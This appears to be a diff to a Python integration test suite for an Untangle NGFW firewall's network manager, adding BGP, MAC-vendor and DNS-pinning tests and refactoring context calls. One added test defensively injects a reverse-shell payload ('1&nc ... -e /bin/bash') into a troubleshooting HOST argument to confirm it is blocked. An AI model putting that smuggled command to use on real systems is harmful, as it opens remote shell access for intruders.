-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("configType") != 'ADDRESSED':
                 continue
@@ -1952,7 +2070,7 @@ class NetworkTests(NGFWTestCase):
         lan_interface["dhcpType"] = "RELAY"
         lan_interface["dhcpRelayAddress"] = DHCP_RELAY_ADDRESS
 
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -1973,7 +2091,7 @@ class NetworkTests(NGFWTestCase):
         Verify DHCP server/relay disabled on LAN interface
         """
         lan_interface = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("configType") != 'ADDRESSED':
                 continue
@@ -1987,7 +2105,7 @@ class NetworkTests(NGFWTestCase):
 
         lan_interface["dhcpType"] = "DISABLED"
 
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         dhcp_results = global_functions.get_dhcp_client_results()
         if dhcp_results["no_privileges"]:
@@ -2002,10 +2120,10 @@ class NetworkTests(NGFWTestCase):
         Do so by validating that the number we specify is written to the apprpriate dnsmasq configuration.
         """
         values = [5000, 100000, 10000000]
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for value in values:
             netsettings["dhcpMaxLeases"] = value
-            uvmContext.networkManager().setNetworkSettings(netsettings)
+            global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
             dnsmasq_max_lease_setting = subprocess.check_output("grep dhcp-lease-max= /etc/dnsmasq.conf", shell=True).decode('utf-8').split('=')
             print(f"{value} vs {dnsmasq_max_lease_setting[1]}")
             assert int(dnsmasq_max_lease_setting[1]) == value, "dnsmasq value matched"
@@ -2016,7 +2134,7 @@ class NetworkTests(NGFWTestCase):
         """
         # Get list of candidate devices to use for swapping
         device_candidates = []
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("isVirtualInterface") or \
                 interface.get("isVlanInterface") or \
@@ -2035,7 +2153,7 @@ class NetworkTests(NGFWTestCase):
         print(f"original_device_mac_mapping={original_device_mac_mapping}")
 
         # Set settings forces sync-settngs call
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         remap_nics(device_candidates, original_device_mac_mapping)
 
@@ -2046,7 +2164,7 @@ class NetworkTests(NGFWTestCase):
         # Get list of candidate devices to use for swapping
         device_candidates = []
         interface_disable_candidate = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("isVirtualInterface") or \
                 interface.get("isVlanInterface") or \
@@ -2071,7 +2189,7 @@ class NetworkTests(NGFWTestCase):
         print(f"original_device_mac_mapping={original_device_mac_mapping}")
 
         # Set settings forces sync-settngs call
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         remap_nics(device_candidates, original_device_mac_mapping)
 
@@ -2082,7 +2200,7 @@ class NetworkTests(NGFWTestCase):
         # Get list of candidate devices to use for swapping
         device_candidates = []
         interface_disable_candidate = None
-        netsettings = uvmContext.networkManager().getNetworkSettings()
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
         for interface in netsettings['interfaces']['list']:
             if interface.get("isVirtualInterface") or \
                 interface.get("isVlanInterface") or \
@@ -2103,7 +2221,7 @@ class NetworkTests(NGFWTestCase):
         print(f"original_device_mac_mapping={original_device_mac_mapping}")
 
         # Set settings forces sync-settngs call
-        uvmContext.networkManager().setNetworkSettings(netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
 
         udev_rules_filename="/etc/udev/rules.d/70-persistent-net.rules"
         with open(udev_rules_filename, "w") as file:
@@ -2159,10 +2277,10 @@ class NetworkTests(NGFWTestCase):
         """
         Status, interface transfer fields
         """
-        first_symbolic_device = uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('INTERFACE_TRANSFER', first_symbolic_device)
+            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_TRANSFER', first_symbolic_device)
         except:
             assert False, "could not run command"
 
@@ -2175,10 +2293,10 @@ class NetworkTests(NGFWTestCase):
         """
         Status, interface IP address fields
         """
-        first_symbolic_device = uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('INTERFACE_IP_ADDRESSES', first_symbolic_device)
+            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_IP_ADDRESSES', first_symbolic_device)
         except:
             assert False, "could not run command"
 
@@ -2191,10 +2309,10 @@ class NetworkTests(NGFWTestCase):
         """
         Status, interface arp fields
         """
-        first_symbolic_device = uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+        first_symbolic_device = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('INTERFACE_ARP_TABLE', first_symbolic_device)
+            status = global_functions.uvmContext.networkManager().getStatus('INTERFACE_ARP_TABLE', first_symbolic_device)
         except:
             assert False, "could not run command"
 
@@ -2210,7 +2328,7 @@ class NetworkTests(NGFWTestCase):
 
         Does not actually need to be connected to verify status
         """
-        network_settings = uvmContext.networkManager().getNetworkSettings()
+        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
 
         # Get WAN/LAN addresses
         wan_address = None
@@ -2223,18 +2341,18 @@ class NetworkTests(NGFWTestCase):
                 if wan_address is not None:
                     continue
                 print("WAN interface status=")
-                status = uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
+                status = global_functions.uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
                 print(status)
                 wan_address = status["v4Address"]
                 (wan_network, wan_prefix) = status["v4MaskedAddress"].split("/")
             else:
                 if lan_network is None:
                     print("LAN interface status=")
-                    status = uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
+                    status = global_functions.uvmContext.networkManager().getInterfaceStatus(interface.get("interfaceId"))
                     print(status)
                     (lan_network, lan_prefix) = status["v4MaskedAddress"].split("/")
 
-        network_settings = uvmContext.networkManager().getNetworkSettings()
+        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
         network_settings["dynamicRoutingSettings"]["enabled"] = True
         network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
         network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "12345"
@@ -2258,11 +2376,11 @@ class NetworkTests(NGFWTestCase):
             "prefix": wan_prefix,
             "ruleId": 1
         }]
-        uvmContext.networkManager().setNetworkSettings(network_settings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)
 
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_TABLE', None)
+            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_TABLE', None)
         except:
             assert False, "could not run command"
 
@@ -2272,7 +2390,7 @@ class NetworkTests(NGFWTestCase):
 
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_BGP', None)
+            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_BGP', None)
         except:
             assert False, "could not run command"
 
@@ -2284,7 +2402,7 @@ class NetworkTests(NGFWTestCase):
 
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_OSPF', None)
+            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_OSPF', None)
         except:
             assert False, "could not run command"
 
@@ -2294,13 +2412,97 @@ class NetworkTests(NGFWTestCase):
         # Empty string is fine
         assert status is not None, "dynamic route ospf is not None"
 
+
+
+    def test_577_bgp_dynamic_routing(self):
+        """
+        This tests adds remote NGFW as a BGP neighbor
+        If successfully connected, the local NGFW's BGP neighbor should show as RemoteNGFW ip address
+        """
+
+        if runtests.quick_tests_only:
+            raise unittest.SkipTest('Skipping a time consuming test')
+        bgp_remote = subprocess.call(["ping","-W","5","-c","1",BGP_REMOTE["serverAddress"]],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        bgp_local = subprocess.call(["ping","-W","5","-c","1",BGP_LOCAL["serverAddress"]],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        if (bgp_remote !=0):
+            raise unittest.SkipTest("Remote BGP NGFW Unreachable")
+        if (bgp_local !=0):
+            raise unittest.SkipTest("Local BGP NGFW Unreachable")
+        remote_uvm_context = Uvm().getUvmContext(timeout=240, scheme="https", hostname=BGP_REMOTE["serverAddress"], username="admin", password=BGP_REMOTE["adminPassword"])
+        remote_uid = remote_uvm_context.getServerUID()
+        local_uid = global_functions.uvmContext.getServerUID()
+        assert(remote_uid != local_uid)
+        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        remote_network_settings = remote_uvm_context.networkManager().getNetworkSettings()
+
+        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
+        network_settings["dynamicRoutingSettings"]["enabled"] = True
+        network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
+        network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "3456"
+        network_settings["dynamicRoutingSettings"]["bgpRouterId"] = "99.99.99.99"
+        network_settings["dynamicRoutingSettings"]["bgpNetworks"]["list"] = [{
+            "area": 0,
+            "description": "local",
+            "enabled": True,
+            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
+            "network": BGP_REMOTE["networks"],
+            "prefix": BGP_REMOTE["lan_prefix"],
+            "ruleId": 1
+        }]
+        network_settings["dynamicRoutingSettings"]["bgpNeighbors"]["list"] = [{
+            "as": "6543",
+            "description": "remote",
+            "enabled": True,
+            "javaClass": "com.untangle.uvm.network.DynamicRouteBgpNeighbor",
+            "ipAddress": BGP_REMOTE["serverAddress"],
+            "ruleId": 1
+        }]
+        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)
+
+        remote_network_settings = remote_uvm_context.networkManager().getNetworkSettings()
+        orig_remote_network_settings = copy.deepcopy(remote_network_settings)
+        remote_network_settings["dynamicRoutingSettings"]["enabled"] = True
+        remote_network_settings["dynamicRoutingSettings"]["bgpEnabled"] = True
+        remote_network_settings["dynamicRoutingSettings"]["bgpRouterAs"] = "6543"
+        remote_network_settings["dynamicRoutingSettings"]["bgpRouterId"] = "88.88.88.88"
+        remote_network_settings["dynamicRoutingSettings"]["bgpNetworks"]["list"] = [{
+            "area": 0,
+            "description": "local",
+            "enabled": True,
+            "javaClass": "com.untangle.uvm.network.DynamicRouteNetwork",
+            "network": BGP_LOCAL["networks"],
+            "prefix": BGP_LOCAL["lan_prefix"],
+            "ruleId": 1
+        }]
+        remote_network_settings["dynamicRoutingSettings"]["bgpNeighbors"]["list"] = [{
+            "as": "3456",
+            "description": "remote",
+            "enabled": True,
+            "javaClass": "com.untangle.uvm.network.DynamicRouteBgpNeighbor",
+            "ipAddress": BGP_LOCAL["serverAddress"],
+            "ruleId": 1
+        }]
+        remote_uvm_context.networkManager().setNetworkSettings(remote_network_settings)
+
+        time.sleep(10)
+        status = None
+        try:
+            status = global_functions.uvmContext.networkManager().getStatus('DYNAMIC_ROUTING_BGP', None)
+        except:
+            assert False, "could not run command"
+        assert( BGP_REMOTE['serverAddress'] in status)
+        print(f"bgp_status={status}")
+        
+        remote_uvm_context.networkManager().setNetworkSettings(orig_remote_network_settings)
+
+
     def test_504_status_routing_table(self):
         """
         Status, current route table
         """
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('ROUTING_TABLE', None)
+            status = global_functions.uvmContext.networkManager().getStatus('ROUTING_TABLE', None)
         except:
             assert False, "could not run command"
 
@@ -2313,13 +2515,13 @@ class NetworkTests(NGFWTestCase):
         """
         Status, QOS
         """
-        network_settings = uvmContext.networkManager().getNetworkSettings()
+        network_settings = global_functions.uvmContext.networkManager().getNetworkSettings()
         network_settings["qosSettings"]["qosEnabled"] = True
-        uvmContext.networkManager().setNetworkSettings(network_settings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(network_settings)
 
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('QOS', None)
+            status = global_functions.uvmContext.networkManager().getStatus('QOS', None)
         except:
             assert False, "could not run command"
 
@@ -2338,7 +2540,7 @@ class NetworkTests(NGFWTestCase):
         """
         status = None
         try:
-            status = uvmContext.networkManager().getStatus('DHCP_LEASES', None)
+            status = global_functions.uvmContext.networkManager().getStatus('DHCP_LEASES', None)
         except:
             assert False, "could not run command"
 
@@ -2421,7 +2623,7 @@ class NetworkTests(NGFWTestCase):
         """
         Troubleshooting, trace
         """
-        interface = uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
+        interface = global_functions.uvmContext.networkManager().getNetworkSettings()["interfaces"]["list"][0]["symbolicDev"]
 
         output = get_troubleshooting_output(command='TRACE',arguments={
                 "TIMEOUT": "10",
@@ -2454,7 +2656,7 @@ class NetworkTests(NGFWTestCase):
 
         # Set settings forces sync-settings call
         # Restore original settings to return to initial settings
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         #sync settings should cleanup .dkpg- extension files
         residual_files = find_files(dir_path, search_string)
         assert len(residual_files) == 0
@@ -2476,12 +2678,12 @@ class NetworkTests(NGFWTestCase):
         assert len(snort_files) > 0
         # Set settings forces sync-settings call
         # Restore original settings to return to initial settings
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         #sync settings should cleanup *-snort* extension files
         snort_files = find_files(dir_path, search_string)
         assert len(snort_files) == 0
     
-    def test_703_remove_unreachable_host(self):
+    def test_011_remove_unreachable_host(self):
         """
         Remove unreachable host
         """
@@ -2517,44 +2719,238 @@ class NetworkTests(NGFWTestCase):
 
         os.replace(untangle_vm_conf_tmp_filename, untangle_vm_conf_filename)
         ## Restart uvm
-        uvmContext = global_functions.restart_uvm()
+        global_functions.uvmContext = global_functions.restart_uvm()
 
         # Add a host entry which is not part of the network
         unreachable_entry = {}
         unreachable_entry['usernameDirectoryConnector'] = 'unrechable_host'
-        
-        unreachable_entry['address'] = global_functions.get_broadcast_address(interface_name)
-        uvmContext.hostTable().setHostTableEntry( unreachable_entry['address'], unreachable_entry )
+        ip_address = global_functions.get_broadcast_address(interface_name)
+        #Cover the PPPOE case where broadcast address is recieved as x.x.x.x/xx instead of x.x.x.x
+        if "/" in ip_address and ip_address.split("/")[1].isdigit():
+        #Broadcast address of pppoe interface is reachable,  modifying last ip segment to 255
+            unreachable_entry['address'] = ".".join(ip_address.split("/")[0].split(".")[:-1] + ["255"])
+        else:
+            unreachable_entry['address'] = ip_address
+
+        global_functions.uvmContext.hostTable().setHostTableEntry( unreachable_entry['address'], unreachable_entry )
 
         client_entry = {}
         client_entry['address'] = remote_control.client_ip
         client_entry['usernameDirectoryConnector'] = remote_control.run_command("hostname -s", stdout=True)
-        uvmContext.hostTable().setHostTableEntry( client_entry['address'], client_entry )
+        global_functions.uvmContext.hostTable().setHostTableEntry( client_entry['address'], client_entry )
         
         # Let the cleanup thread remove the unreachable host
         time.sleep(90)
 
         # Try to retrieve the host entry
-        unreachable_entry = uvmContext.hostTable().getHostTableEntry( unreachable_entry['address'] )
-        client_entry = uvmContext.hostTable().getHostTableEntry( client_entry['address'] )
+        unreachable_entry = global_functions.uvmContext.hostTable().getHostTableEntry( unreachable_entry['address'] )
+        client_entry = global_functions.uvmContext.hostTable().getHostTableEntry( client_entry['address'] )
 
         ##
         ## Restore orginal untangle-vm.conf
         shutil.copyfile(untangle_vm_conf_original_filename, untangle_vm_conf_filename)
-        uvmContext = global_functions.restart_uvm()
+        global_functions.uvmContext = global_functions.restart_uvm()
 
         assert (unreachable_entry == None)
         assert (client_entry != None)
 
         # Cleanup
-        uvmContext.hostTable().removeHostTableEntry( client_entry['address'] )
+        global_functions.uvmContext.hostTable().removeHostTableEntry( client_entry['address'] )
 
+    def test_705_mac_address_vendor_lookup_list(self):
+        """
+        Verify we can get vendors for the mac addresses
+        """
+        deviceStatus = global_functions.uvmContext.networkManager().getDeviceStatus()
+        interfaceList = deviceStatus["list"]
+        if(len(interfaceList) <= 0): 
+            raise unittest.SkipTest('Interface Not Known')
+        if(interfaceList[0]["macAddress"] == None):
+            raise unittest.SkipTest('MAC Address Not Known')
+        mac_address_list = { 'javaClass': 'java.util.LinkedList', 'list': [interfaceList[0]["macAddress"]] }
+
+        # Get vendor for mac Address
+        mac_address_vendor_map = global_functions.uvmContext.networkManager().lookupMacVendorList(mac_address_list)
+        assert(len(mac_address_vendor_map) > 0)
+
+    def test_706_lookup_vendor_for_mac_address_list(self):
+        """
+        Verify we can get vendors for the mac addresses.
+        """
+        # MAC address list in string format
+        mac_address_list_string = "f0:35:75:af:2e:72,84:47:09:02:41:e6,00:23:81:52:e4:1e,5c:61:99:42:44:5e,48:25:67:01:e4:e9"
+
+        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(mac_address_list_string)
+
+        # Check if result is None
+        self.assertIsNotNone(mac_address_vendor_map, "The result should not be None.")
+        self.assertIsInstance(mac_address_vendor_map, list, "The result should be a list.")
+
+        # Verify the output contains expected fields
+        for entry in mac_address_vendor_map:
+            self.assertIsInstance(entry, dict, "Each entry should be a dictionary.")
+            self.assertIn('MAC', entry, "Each entry should contain 'MAC'.")
+            self.assertIn('Organization', entry, "Each entry should contain 'Organization'.")
+
+    def test_707_lookup_vendor_for_single_mac_address(self):
+        """
+        Verify we can get the vendor for a single MAC address.
+        """
+        # Single MAC address
+        mac_address_string = "f0:35:75:af:2e:72"
+
+        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(mac_address_string)
+
+        # Check if result is None
+        self.assertIsNotNone(mac_address_vendor_map, "The result should not be None.")
+        self.assertIsInstance(mac_address_vendor_map, list, "The result should be a list.")
+
+        # Check that the list has exactly one entry
+        self.assertEqual(len(mac_address_vendor_map), 1, "The result should contain exactly one entry.")
+
+        # Verify the single entry in the list contains the expected fields
+        entry = mac_address_vendor_map[0]
+        self.assertIsInstance(entry, dict, "The entry should be a dictionary.")
+        self.assertIn('MAC', entry, "The entry should contain 'MAC'.")
+        self.assertIn('Organization', entry, "The entry should contain 'Organization'.")
+
+    def test_708_lookup_vendor_for_empty_mac_address(self):
+        """
+        Verify behavior for an empty MAC address.
+        """
+        # Empty MAC address
+        empty_mac_address = ""
+
+        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(empty_mac_address)
+
+        # Check if result is None
+        self.assertIsNone(mac_address_vendor_map, "The result should be None for an empty MAC address.")
+    
+    def test_709_lookup_vendor_for_null_mac_address(self):
+        """
+        Verify behavior for a null MAC address.
+        """
+        # Null MAC address
+        null_mac_address = None
+
+        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(null_mac_address)
+
+        # Check if result is None
+        self.assertIsNone(mac_address_vendor_map, "The result should be None for a null MAC address.")
+
+    def test_710_lookup_vendor_for_invalid_mac_address(self):
+        """
+        Verify behavior for an invalid MAC address.
+        """
+        # Invalid MAC address
+        invalid_mac_address = "0:1A:B:3C:"
+
+        mac_address_vendor_map = global_functions.uvmContext.deviceTable().lookupMacVendor(invalid_mac_address)
+
+        # Check if the result contains an 'Organization' field with value 'Unknown'
+        self.assertEqual(mac_address_vendor_map, [{'Organization': 'Unknown', 'MAC': '0:1A:B:3C:'}],
+                        "The result should have an 'Organization' field with value 'Unknown' for an invalid MAC address.")
+
+    def test_720_dnsmasq_source(self):
+        """
+        Verify that DNS resolver addresses are properly "pinned" to their interfaces
+        """
+        tcpdump_timeout = 5
+
+        # Public DNS resolvers from https://www.lifewire.com/free-and-public-dns-servers-2626062
+        public_dns_resolvers = ["8.8.8.8", "8.8.4.4", "9.9.9.9", "149.112.112.112"]
+        dns_addresses = ["www.google.com", "www.microsoft.com", "www.apple.com", "www.facebook.com"]
+        netsettings = global_functions.uvmContext.networkManager().getNetworkSettings()
+
+        # Get enabled WAN interfaces, static, Ethernet
+        wan_interfaces = []
+        for interface in netsettings["interfaces"]["list"]:
+            if interface["isWan"] is not True:
+                continue
+            if interface.get("configType") == 'DISABLED':
+                continue
+            if interface.get("v4ConfigType") != 'STATIC':
+                continue
+            if interface["v4ConfigType"] == "PPPOE":
+                continue
+            wan_interfaces.append(interface)
+
+        # Don't continue if we have too little, too many interfaces
+        if len(wan_interfaces) < 2:
+            raise unittest.SkipTest("less than 2 WAN interfaces found")
+
+        if len(wan_interfaces) > len(public_dns_resolvers):
+            raise unittest.SkipTest("more WAN interfaces than defined DNS resolvers")
+
+        # Update DNS resolvers from public list
+        # maintain map of symbolic dev and the associated public DNS resolver
+        dev_resolver_map = {}
+        public_dns_resolver_index = 0
+        for wan_interface in wan_interfaces:
+            wan_interface["v4StaticDns1"] = public_dns_resolvers[public_dns_resolver_index]
+            wan_interface["v4StaticDns2"] = ""
+            dev_resolver_map[wan_interface["symbolicDev"]] = public_dns_resolvers[public_dns_resolver_index]
+            public_dns_resolver_index += 1
+        global_functions.uvmContext.networkManager().setNetworkSettings(netsettings)
+        print(dev_resolver_map)
+
+        # Creae a forked timeout process to run tcpdump on DNS port.
+        output_file_name = f"/tmp/{self.__class__.__name__}_{sys._getframe().f_code.co_name}"
+        command=f"rm -f {output_file_name} ; timeout {tcpdump_timeout}s tcpdump -i any -n --direction out port 53 > {output_file_name} &"
+        print(f"command={command}")
+        subprocess.call(command, shell=True, stderr=sys.stdout.buffer)
+
+        # Perform lookups from client
+        for dns_address in dns_addresses:
+            remote_control.run_command(f"dig {dns_address}")
+
+        # The lookups will be quick so just do a full wait for the forked process to complete
+        time.sleep(tcpdump_timeout)
+
+        # Read tcpdump
+        with open(output_file_name, "r") as f:
+            lines = f.readlines()
+            f.close()
+
+        invalid_dns = False
+        # Analyze tcpdump for our WAN interfaces to verify DNS resolvers are going where we expect.
+        # In the following example, expecting eth2 to be using 8.8.8.8.
+        # 12:25:24.719264 eth2  Out IP arista.domain.com.4028 > 8.8.8.8.domain: 60147+ [1au] A? www.notlikely.com. (58)
+        tcpdump_match_re = re.compile('^[^\s]+\s+([^\s]+)\s+Out\s+IP\s+([^\s]+)\s+>\s+([^\:]+).+')
+        for line in lines:
+            matches = tcpdump_match_re.match(line)
+            if matches is not None:
+                dev = matches.group(1)
+                resolver = matches.group(3)
+                resolver = resolver[0:resolver.rfind(".")]
+                if dev in dev_resolver_map:
+                    print(f"dev={dev}, resolver={resolver}")
+                    if dev_resolver_map[dev] != resolver:
+                        print(f"found incorrect dns resolver on device")
+                        invalid_dns = True
+
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        assert invalid_dns is False, "dns resolvers properly pinned to devices"
+
+    def test_710_runtroubleshoot_argument_exploit_test(self):
+        """
+        Verify argument exploit is not possible in runTroubleshooting functionality
+        """
+        # runTroubleshooting using arguments matching suspicious characters
+        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "1&nc 192.168.56.129:3333 -e /bin/bash" })
+        time.sleep(3)
+        assert(execResult == None)
+
+        # runTroubleshooting using valid arguments
+        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "amazon.com" })
+        time.sleep(3)
+        assert(execResult.getResult() == 0)
 
     @classmethod
     def final_extra_tear_down(cls):
         # Restore original settings to return to initial settings
         # print("orig_netsettings <%s>" % orig_netsettings)
-        uvmContext.networkManager().setNetworkSettings(orig_netsettings)
+        global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
 
 
 test_registry.register_module("network", NetworkTests)
